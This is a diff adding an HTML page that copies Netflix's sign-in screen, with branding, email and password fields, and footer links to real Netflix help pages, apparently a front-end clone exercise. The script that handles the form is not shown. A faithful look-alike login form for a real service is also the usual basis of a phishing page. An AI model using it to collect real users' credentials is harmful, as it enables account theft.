@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Netflix</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
+    />
+
+    <link rel="stylesheet" href="/css/signin.css" />
+    <link rel="icon" href="/images/icons8-netflix-24.png" />
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style></style>
+  </head>
+  <body>
+    <div class="logo">
+      <img
+        src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"
+        alt="Netflix Logo"
+      />
+    </div>
+
+    <div class="login-container">
+      <h2 class="font">Sign In</h2>
+      <div class="content--mal" id="login-form">
+        <div class="form-group" style="position: relative">
+          <input type="text" placeholder="Email or mobile number" id="email" />
+        </div>
+        <div class="form-group">
+          <input type="password" placeholder="Password" id="Password" />
+        </div>
+
+        <button class="btn" type="submit">Sign In</button>
+        <p id="error" style="color: red"></p>
+        <div class="or-divider">OR</div>
+        <button class="btn-sign-in">Use a Sign-In Code</button>
+      </div>
+      <div class="form-group form-forgot-container">
+        <a href="#" class="small-text underline form-forgot"
+          >Forgot password?</a
+        >
+      </div>
+      <div class="checkbox-group">
+        <input type="checkbox" id="remember" class="scale-10" />
+        <label for="remember">Remember me</label>
+      </div>
+      <div class="small-text">
+        <span class="font-300"> New to Netflix?</span>
+        <a href="/index.html"
+          ><span class="p-4 text-white font-bold">Sign up now.</span></a
+        >
+      </div>
+      <div class="small-text">
+        This page is protected by Google reCAPTCHA to ensure you're not a bot.
+        <a href="#"><span class="text-blue-300">Learn more.</span></a>
+      </div>
+    </div>
+
+    <footer
+      class="w-full bg-black text-gray-400 text-sm px-6 sm:px-12 py-10 h-90"
+    >
+      <div class="max-w-screen-xl mx-auto space-y-6">
+        <p>
+          Questions?
+          <a
+            href="https://www.netflix.com/NotFound?prev=https%3A%2F%2Fwww.netflix.com%2Fng%2F%257BSUPPORT_LINK%257D"
+            class="hover:text-white p-3"
+            >Contact us.</a
+          >
+        </p>
+
+        <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
+          <a
+            href="https://help.netflix.com/support/412"
+            class="hover:underline hover:text-white underline"
+            >FAQ</a
+          >
+          <a
+            href="https://help.netflix.com/en"
+            class="hover:underline hover:text-white underline"
+            >Help Center</a
+          >
+          <a
+            href="https://help.netflix.com/legal/termsofuse"
+            class="hover:underline hover:text-white underline"
+            >Terms of Use</a
+          >
+          <a
+            href="https://help.netflix.com/legal/privacy"
+            class="hover:underline hover:text-white underline"
+            >Privacy</a
+          >
+          <a href="#" class="hover:underline hover:text-white underline"
+            >Cookie Preferences</a
+          >
+          <a
+            href="https://help.netflix.com/en/node/134094"
+            class="hover:underline hover:text-white underline"
+            >Corporate Information</a
+          >
+        </div>
+      </div>
+    </footer>
+  </body>
+
+  <script src="/js/scrip.js"></script>
+</html>
